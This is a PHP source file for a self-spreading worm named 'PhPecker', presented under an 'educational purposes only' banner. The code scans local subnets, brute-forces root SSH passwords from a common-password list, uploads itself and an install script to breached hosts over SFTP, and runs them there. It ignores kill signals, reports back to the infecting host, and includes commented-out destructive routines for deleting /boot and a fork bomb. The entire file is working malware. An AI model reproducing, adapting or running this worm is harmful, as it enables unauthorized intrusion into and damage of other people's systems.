#!/usr/bin/env php
<?php

declare(ticks = 1, strict_types = 1);

const MESSAGE = <<< MESSAGE

+--------------------------------------------------------------------+
|                                                                    |
| ██▓███    ██░ ██  ██▓███  ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███    |
| ▓██░  ██▒▓██░ ██▒▓██░  ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒  |
| ▓██░ ██▓▒▒██▀▀██░▓██░ ██▓▒▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒  |
| ▒██▄█▓▒ ▒░▓█ ░██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄    |
| ▒██▒ ░  ░░▓█▒░██▓▒██▒ ░  ░░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒  |
| ▒▓▒░ ░  ░ ▒ ░░▒░▒▒▓▒░ ░  ░░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░  |
| ░▒ ░      ▒ ░▒░ ░░▒ ░      ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  |
| ░░        ░  ░░ ░░░          ░   ░        ░ ░░ ░    ░     ░░   ░   |
| ░  ░  ░            ░  ░░ ░      ░  ░      ░  ░   ░                 |
| ░                                                                  |
|                                                                    |
| PhPecker: a tiny, cute creature nesting on vulnerable hosts!       |
|                                                                    |
| @version  0.1                                                      |
| @license  MIT                                                      |
| @requires PHP >= 7.3.0                                             |
|                                                                    |
| WARNING: This code is intended for educational purposes only.      |
| It is designed to simulate network security scenarios for learning |
| purposes. Any unauthorized use of this code for malicious          |
| activities is strictly prohibited.                                 |
+--------------------------------------------------------------------+
\r\n
MESSAGE;

const INSTALLATION_SCRIPT = <<< BASH
#!/bin/bash

if command -v apt &> /dev/null; then
  apt install php-cli php-ssh2 -y
elif command -v yum &> /dev/null; then
  yum install php-cli php-ssh2 -y
elif command -v dnf &> /dev/null; then
  dnf install php-cli php-ssh2 -y
else
  exit
fi

if [ -f "/tmp/.phpecker" ]; then
  php -f /tmp/.phpecker &
fi

BASH;

const NAME  = "phpecker";
const PORT  = 55555;
const SELF  = "/tmp/." . NAME;
const INST  = "/tmp/.install";
const MOM   = "/tmp/.mom";
const TASKS = [ "spread", "listen", "destroy" ];

/**
 * The list of passwords to attempt.
 * (Wikipedia: 10,000 most common passwords)
 */
const DICTIONARY = [
  "123456",    "dragon",   "master",     "superman", "jennifer",
  "password",  "123123",   "666666",     "1qaz2wsx", "zxcvbnm",
  "12345678",  "baseball", "qwertyuiop", "7777777",  "asdfgh",
  "qwerty",    "abc123",   "123321",     "jordan",   "hunter",
  "123456789", "football", "mustang",    "121212",   "buster",
  "12345",     "monkey",   "1234567890", "000000",   "soccer",
  "1234",      "letmein",  "michael",    "qazwsx",   "harley",
  "111111",    "696969",   "654321",     "123qwe",   "batman",
  "1234567",   "shadow",   "trustno1",   "killer",   "andrew",
  /**
   * Other more passwords to attempt...
   */
];

ini_set("memory_limit",           "-1");
ini_set("display_errors",         "0");
ini_set("display_startup_errors", "0");

cli_set_process_title(NAME);
gc_enabled() or gc_enable();

// ignore POSIX signals
pcntl_async_signals(true);
pcntl_signal(SIGINT,  function (): void {});
pcntl_signal(SIGHUP,  function (): void {});
pcntl_signal(SIGTERM, function (): void {});
pcntl_signal(SIGQUIT, function (): void {});

// check runtime environment
strcmp(PHP_OS, "Linux") === 0               or exit(1);
version_compare(PHP_VERSION, "7.3.0", ">=") or exit(1);
posix_getuid() === 0                        or exit(1);

/**
 * Network interface struct
 */
final class local_interface {
  public $address   = "";
  public $netmask   = "";
  public $network   = "";
  public $broadcast = "";
}

$output_enabled = false;
$output         = "/dev/pts/1";

function main(int $argc, array $argv): void {

  $argv = parse_argv($argc, $argv);

  global $output, $output_enabled;
  if (isset($argv["output"])) {
    $output_enabled = true;
    if ($argv["output"] !== "default") {
      $output = $argv["output"];
    }
  }

  output(MESSAGE, false);

  foreach (TASKS as $task) {
    if (strcmp($task, ($argv["except"] ?? "")) !== 0) {
      if (pcntl_fork() === 0) {
        $task(); exit(0);
      }
    }
  }

  say_hi_to_mom();

}

/**
 * Parse command line arguments.
 *
 * @param int   $argc the number of arguments
 * @param array $argv an array containing the arguments
 * @return array      the parsed arguments
 */
function parse_argv(int $argc, array $argv): array {

  $parsed_argv = [];
  for ($i = 0; $i < $argc; $i++) {
    $key = trim(strtolower($argv[$i]));
    if (in_array($key, [ "output", "except" ])) {
      $parsed_argv[$key] = $argv[++$i];
    }
  }

  return $parsed_argv;

}

/**
 * Output a message to a file.
 *
 * @param string $message       the message to be output.
 * @param bool   $with_metadata whether to include metadata.
 * @return void
 */
function output(string $message, bool $with_metadata = true): void {

  global $output, $output_enabled;

  if ($with_metadata) {
    $message = sprintf("[%.4lf] [PID %d] %s\r\n", microtime(true), posix_getpid(), $message);
  }
  if ($output_enabled) {
    @file_put_contents($output, $message, FILE_APPEND);
  }

}

/**
 * Send "hi" to the specified host, optionally waiting for a response.
 *
 * @param string $host
 * @param int    $port
 * @param bool   $wait_response
 * @return bool
 */
function say_hi(string $host, int $port = PORT, bool $wait_response = true): bool {
  static $GREETING = "hi";
  return send_udp_to($host, $port, $GREETING, $wait_response) !== false;
}

/**
 * Send "hi mom" to the "mom" host, without waiting for a response.
 *
 * @return bool
 */
function say_hi_to_mom(): bool {

  static $GREETING = "hi mom";
  $my_mom = "127.0.0.1";

  // check if mom's ip address is defined in the mom file.
  if (file_exists(MOM)) {
    if (false !== $mom = @file_get_contents(MOM)) {
      if (filter_var($mom, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false) {
        $my_mom = trim($mom);
      }
    }
  }

  return send_udp_to($my_mom, PORT, $GREETING, false);

}

/**
 * Start listening for incoming messages on all local network interfaces.
 *
 * @return void
 */
function listen(): void {

  $local_interfaces = get_local_interfaces();

  foreach ($local_interfaces as $interface) {
    if (pcntl_fork() === 0) {
      listen_on_network($interface); exit(0);
    }
  }

}

/**
 * Listen for incoming messages on the specified network interface.
 *
 * @param local_interface $interface the network interface to listen on.
 * @return void
 */
function listen_on_network(local_interface $interface): void {

  $socket = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
  if ($socket === false) {
    return;
  }

  if (@socket_bind($socket, $interface->address, PORT) === false) {
      Output("bind failed");
    return;
  }
  output(sprintf("Start listening on udp://%s:%d", $interface->address, PORT));

  while (@socket_recvfrom($socket, $received_data, 65535, 0, $client, $client_port)) {

    // check if the received message is "hi"
    if (trim(strtolower($received_data)) === "hi") {
      // respond with "hi" to the sender.
      say_hi($client, $client_port, false);
    }

    output(sprintf("Received \"%s\" from %s", $received_data, $client));
  }

}

/**
 * Spread the infection to vulnerable hosts on the network.
 *
 * @return void
 */
function spread(): void {
  output("Start spreading kids all over the network...");

  $local_interfaces = get_local_interfaces();
  foreach ($local_interfaces as $interface) {

    $network_expression = sprintf("%s/%s", $interface->network, $interface->netmask);
    output(sprintf("Start scanning %s...", $network_expression));

    $network_hosts = get_network_hosts($interface);
    foreach ($network_hosts as $host) {

      // Skip if the host is not active or is already infected
      if (!is_alive_host($host) || is_infected_host($host)) {
        continue;
      }

      output(sprintf("Found active host %s", $host));

      $ssh2_connection = ssh_connect($host);
      if ($ssh2_connection === false) {
        output(sprintf("Failed to exploit password for %s", $host));
        continue;
      }

      output(sprintf("Successfully exploited the password for %s", $host));
      if (infect($ssh2_connection, $host, $interface->address)) {
        output(sprintf("Successfully infected host %s!", $host));
      }

    }
  }
}

/**
 * Retrieve details of local network interfaces.
 *
 * @return local_interface[]
 */
function get_local_interfaces(): array {

  $configured_interfaces = @net_get_interfaces();
  if ($configured_interfaces === false) {
    // return an empty array if retrieval fails
    return [];
  }

  /** @var local_interface[] $interfaces */
  $interfaces = [];

  foreach ($configured_interfaces as $name => $details) {

    // skip inactive interface or loopback interface
    if (!($details["up"] ?? false) || trim($name) === "lo") {
      continue;
    }

    $unicast = $details["unicast"] ?? [];
    foreach ($unicast as $address) {
      if (!isset($address["address"])) {
        continue;
      }

      $netmask   = $address["netmask"];
      $broadcast = $address["broadcast"] ?? false;
      $address   = $address["address"];

      // skip IPv6 addresses
      if (false === filter_var($address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        continue;
      }

      // calculate broadcast address if not provided
      if ($broadcast === false) {
        $broadcast = get_broadcast_address($address, $netmask);
      }

      // calculate network address
      $network = get_network_address($address, $netmask);

      $interface = new local_interface();
      $interface->address   = $address;
      $interface->netmask   = $netmask;
      $interface->network   = $network;
      $interface->broadcast = $broadcast;

      $interfaces[] = $interface;
    }

  }

  return $interfaces;

}

/**
 * Calculate the broadcast address given an ip address and netmask.
 *
 * @param string $address the ip address.
 * @param string $netmask the subnet mask.
 * @return string         the broadcast address.
 */
function get_broadcast_address(string $address, string $netmask): string {

  $long_address = ip2long($address);
  $long_netmask = ip2long($netmask);
  $long_broadcast = $long_address | (~$long_netmask);

  return long2ip($long_broadcast);

}

/**
 * Calculate the network address given an ip address and netmask.
 *
 * @param string $address the ip address.
 * @param string $netmask the subnet mask.
 * @return string         the network address.
 */
function get_network_address(string $address, string $netmask): string {

  $long_address = ip2long($address);
  $long_netmask = ip2long($netmask);
  $long_network = $long_netmask & $long_address;

  return long2ip($long_network);

}

/**
 * Retrieve the list of host ip addresses within the network of a given interface.
 *
 * @param local_interface $interface
 * @return string[]                  the list of host ip addresses.
 */
function get_network_hosts(local_interface $interface): array {

  /** @var string[] $hosts */
  $hosts = [];

  $long_address   = ip2long($interface->address);
  $long_network   = ip2long($interface->network);
  $long_broadcast = ip2long($interface->broadcast);

  for ($host = $long_network + 1; $host < $long_broadcast; $host++) {
    $host !== $long_address and $hosts[] = long2ip($host);
  }

  return $hosts;

}

/**
 * Check if a host is alive.
 *
 * @param string $host
 * @return bool        true if the host is alive (responds to icmp or has open tcp ports).
 */
function is_alive_host(string $host): bool {
  return send_icmp_to($host) || count(scan_open_tcp_ports($host)) > 0;
}

/**
 * Check if a host is already infected.
 *
 * @param string $host
 * @return bool
 */
function is_infected_host(string $host): bool {
  return send_udp_to($host, PORT, "hi", true);
}

const SOCKET_DEFAULT_TIMEOUT = [ "sec" => 3, "usec" => 0 ];

/**
 * Send an icmp packet to the specified host and optionally wait for a response.
 *
 * @param string $host          the target host to send the icmp packet to.
 * @param bool   $wait_response whether to wait for a response.
 * @param array  $wait_timeout  the timeout duration for waiting for a response.
 * @return bool
 */
function send_icmp_to(string $host,
  bool  $wait_response = true,
  array $wait_timeout  = SOCKET_DEFAULT_TIMEOUT
): bool {

  static $icmp_packet = "\x08\x00\xb4\x2d\x00\x00\x00\x00hello";

  $socket = @socket_create(AF_INET, SOCK_RAW, 1);
  if ($socket === false) {
    return false;
  }

  @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $wait_timeout);
  @socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $wait_timeout);

  if (@socket_connect($socket, $host, 0) === false) {
    return false;
  }
  if (@socket_send($socket, $icmp_packet, strlen($icmp_packet), 0) === false) {
    return false;
  }

  // if not waiting response, close the socket and return true
  if (!$wait_response) {
    socket_close($socket);
    return true;
  }

  $bytes_read = @socket_read($socket, 65535);
  socket_close($socket);

  return $bytes_read !== false;

}

/**
 * Send udp data to the specified host and optionally wait for a response.
 *
 * @param string $host          the target host to send the udp data to.
 * @param int    $port          the port on the target host.
 * @param string $data          the data to be sent.
 * @param bool   $wait_response whether to wait for a response.
 * @param array  $wait_timeout  the timeout duration for waiting for a response.
 * @return bool|string
 */
function send_udp_to(string $host, int $port, string $data,
  bool  $wait_response = true,
  array $wait_timeout  = SOCKET_DEFAULT_TIMEOUT
) {

  $socket = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
  if ($socket === false) {
    return false;
  }

  @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $wait_timeout);
  @socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $wait_timeout);

  if (@socket_sendto($socket, $data, strlen($data), 0, $host, $port) === false) {
    return false;
  }

  // if not waiting for response, close the socket and return true
  if (!$wait_response) {
    socket_close($socket);
    return true;
  }

  $bytes_read = @socket_read($socket, 65535);
  socket_close($socket);

  return $bytes_read;

}

/**
 * Scan for open tcp ports on the specified host.
 *
 * @param string $host the target host to scan for open tcp ports.
 * @return int[]
 */
function scan_open_tcp_ports(string $host): array {

  // well-known tcp ports to scan
  static $TCP_WELL_KNOWN_PORTS = [
    20, 21, 22, 23, 25, 53, 80, 110, 143, 161, 443, 587, 2525, 3306, 6514
  ];

  $open_ports = [];

  foreach ($TCP_WELL_KNOWN_PORTS as $port) {
    $connection = @fsockopen($host, $port, $code, $message, 3);
    if (is_resource($connection)) {
      $open_ports[] = $port;
      fclose($connection);
    }
  }

  return $open_ports;

}

/**
 * Establish an ssh connection to the specified host.
 *
 * @param string $host
 * @param int    $port
 * @return resource|false an ssh connection resource on success, false on failure.
 */
function ssh_connect(string $host, int $port = 22) {

  // attempt to establish an ssh connection.
  $ssh2_connection = @ssh2_connect($host, $port);
  if ($ssh2_connection === false) {
    return false;
  }

  // iterate through a dictionary of passwords to attempt authentication
  foreach (DICTIONARY as $password) {
    if (@ssh2_auth_password($ssh2_connection, "root", $password)) {
      $execution_result = @ssh2_exec($ssh2_connection, "echo \"hi!\r\n\"");

      if ($execution_result !== false && is_resource($execution_result)) {
        return $ssh2_connection;
      }

    }
  }
  return false;

}

/**
 * Attempt to infect a remote host.
 *
 * @param resource $ssh2_connection
 * @param string   $host
 * @param string   $mom
 * @param int      $retry
 * @return bool
 */
function infect($ssh2_connection, string $host, string $mom, int $retry = 0): bool {

  // abort if retry limit exceeded or ssh connection is not valid
  if ($retry > 5 || !is_resource($ssh2_connection)) {
      return false;
  }

  $self_script = @file_get_contents(__FILE__);
  if (
    false === @file_put_contents(SELF, $self_script) ||
    false === @file_put_contents(INST, INSTALLATION_SCRIPT)
  ) {
    return infect($ssh2_connection, $host, $mom, ++$retry);
  }

  chmod(SELF, 0777);
  chmod(INST, 0777);

  if (!send_sftp_file_to($ssh2_connection, SELF, SELF)) {
    return infect($ssh2_connection, $host, $mom, ++$retry);
  }
  if (!send_sftp_file_to($ssh2_connection, INST, INST)) {
    return infect($ssh2_connection, $host, $mom, ++$retry);
  }

  $COMMAND_CREATE_MOM  = sprintf("echo \"%s\" > %s", $mom, MOM);
  $COMMAND_RUN_INSTALL = sprintf("bash %s &", INST);

  if (!send_ssh_command_to($ssh2_connection, $COMMAND_CREATE_MOM)) {
    return infect($ssh2_connection, $host, $mom, ++$retry);
  }
  if (!send_ssh_command_to($ssh2_connection, $COMMAND_RUN_INSTALL)) {
    return infect($ssh2_connection, $host, $mom, ++$retry);
  }

  @ssh2_disconnect($ssh2_connection);
  return true;

}

/**
 * Send a local file to a remote host via sftp.
 *
 * @param resource $ssh2_connection
 * @param string   $local_path      the local path of the file to be sent.
 * @param string   $remote_path     the remote path where the file will be stored.
 * @return bool
 */
function send_sftp_file_to($ssh2_connection, string $local_path, string $remote_path): bool {

  // establish an sftp connection
  $sftp_connection = @ssh2_sftp($ssh2_connection);
  if ($sftp_connection === false) {
    return false;
  }

  $local_file = @fopen($local_path, "r");
  $remote_file = @fopen("ssh2.sftp://" . $sftp_connection . $remote_path, "w");

  if ($local_file === false || $remote_file === false) {
    @fclose($local_file);
    @fclose($remote_file);
    return false;
  }

  $result = @stream_copy_to_stream($local_file, $remote_file);
  @fclose($local_file);
  @fclose($remote_file);

  return $result !== false;

}

/**
 * Send an ssh command to the specified ssh2 connection resource.
 *
 * @param resource $ssh2_connection
 * @param string   $command
 * @return bool
 */
function send_ssh_command_to($ssh2_connection, string $command): bool {

  $execution = @ssh2_exec($ssh2_connection, $command);
  if ($execution === false) {
    return false;
  }

  stream_set_blocking($execution, true);

  $result = @stream_get_contents($execution);
  fclose($execution);

  return $result !== false;

}

/**
 * Destroy the host by executing destructive actions.
 *
 * Only use this function in controlled environments
 * and with full understanding of the potential consequences.
 *
 * @return void
 */
function destroy(): void {

  /**
   * Uncomment or implement destructive actions below:
   */
  //destroy_delete_bootloader();
  //destroy_fork_bomb();
}

/**
 * Delete the bootloader file to render the system unbootable.
 *
 * @return void
 */
function destroy_delete_bootloader(): void {
  // is_dir("/boot") and @unlink("/boot");
}

/**
 * Execute a fork bomb to overwhelm the system's resources.
 *
 * @return void
 */
function destroy_fork_bomb(): void {
  // while (true) @pcntl_fork();
}

main($_SERVER["argc"], $_SERVER["argv"]);